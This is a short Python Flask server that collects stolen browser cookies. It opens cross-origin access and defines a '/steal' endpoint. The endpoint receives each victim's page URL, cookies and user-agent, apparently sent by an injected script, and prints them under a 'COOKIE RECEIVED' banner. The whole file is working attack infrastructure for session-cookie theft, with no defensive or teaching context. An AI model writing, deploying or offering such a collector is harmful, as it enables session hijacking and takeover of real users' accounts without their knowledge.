from flask import Flask, request
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

@app.route('/', methods=['GET'])
def home():
    return "Server is running!"

@app.route('/steal', methods=['POST'])
def steal():
    data = request.json
    
    print("\n===== COOKIE RECEIVED =====")
    print("URL:", data.get('url'))
    print("Cookies:", data.get('cookies'))
    print("User-Agent:", data.get('ua'))
    print("==========================\n")
    
    return "OK", 200
